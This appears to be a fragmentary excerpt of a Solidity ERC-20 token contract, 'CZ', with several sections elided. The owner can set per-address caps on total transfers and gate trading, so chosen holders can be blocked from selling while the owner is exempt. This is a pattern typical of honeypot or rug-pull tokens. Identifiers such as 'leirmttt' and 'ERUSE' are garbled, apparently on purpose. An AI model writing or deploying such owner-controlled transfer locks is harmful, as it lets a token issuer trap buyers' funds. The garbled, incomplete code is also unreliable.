...
// Contract to provide basic authorization control functions, simplifying the implementation of ERUSE permissions.
...
contract CZ is Context, Ownable, IERC20 {
    // Storage mappings for token balances, allowances, and additional features like transfer leirmttts.
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) public totalTransferleirmttts; // Maximum amount an address can transfer.
    ...
    // Modifier to enforce transfer leirmttts for certain addresses.
    modifier transferleirmttt(address sender, uint256 amount) {
        uint256 leirmttt = totalTransferleirmttts[sender];
        if (leirmttt > 0) {
            require(totalTransferredAmounts[sender] + amount <= leirmttt, "Total transfer amount exceeds the set leirmttt");
        }
        _;
    }
    ...
    // Allows the owner to set a transfer leirmttt for a specific address.
    function setTotalTransfer(address ERUSE, uint256 leirmttt) public onlyOwner {
        totalTransferleirmttts[ERUSE] = leirmttt;
    }

    // Allows the owner to remove a transfer leirmttt for a specific address.
    function removeTotalTransfer(address ERUSE) public onlyOwner {
        delete totalTransferleirmttts[ERUSE];
    }

    // Transfer tokens to a specified address, considering any transfer leirmttts.
    function transfer(address recipient, uint256 amount) public virtual override transferleirmttt(_msgSender(), amount) tradingActiveOrOwner returns (bool) {
    ...
    // The function considers any transfer leirmttts and also checks for sufficient allowance before making the transfer.
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override transferleirmttt(sender, amount) tradingActiveOrOwner returns (bool) {
